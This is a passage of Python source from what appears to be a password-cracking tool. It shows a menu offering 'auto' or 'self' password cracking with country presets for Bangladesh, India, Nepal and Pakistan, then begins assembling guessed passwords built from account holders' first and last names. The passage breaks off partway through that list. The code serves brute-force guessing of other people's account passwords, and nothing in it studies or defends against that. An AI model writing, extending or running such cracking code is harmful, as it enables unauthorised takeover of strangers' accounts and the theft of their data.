    def pasw(self):       
        pw = []
        clear()
        
        # Password Selection Menu
        print(" \x1b[1;97m[1] AUTO PASS CRACK")
        print(" \x1b[1;97m[2] SELF PASS CRACK")
        linex()
        ppp = input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOOSE : ')
        
        if ppp in ['1','01']:
            # Auto Password Menu
            clear()
            print(" \x1b[1;97m [1] BD AUTO PASS")
            print(" \x1b[1;97m [2] INDIA AUTO PASS")
            print(" \x1b[1;97m [3] NEPAL AUTO PASS")
            print(" \x1b[1;97m [4] PAK AUTO PASS")
            linex()
            auto_choice = input(' \x1b[1;97m CHOOSE COUNTRY : ')
            linex()
            
            if auto_choice in ['1','01']:
                # Bangladesh Auto Passwords
                pw.extend([
                    'first last', 'firstlast', 'First Last', 'first12345',
                    'first1234', 'first123', 'first12', 'first1122',
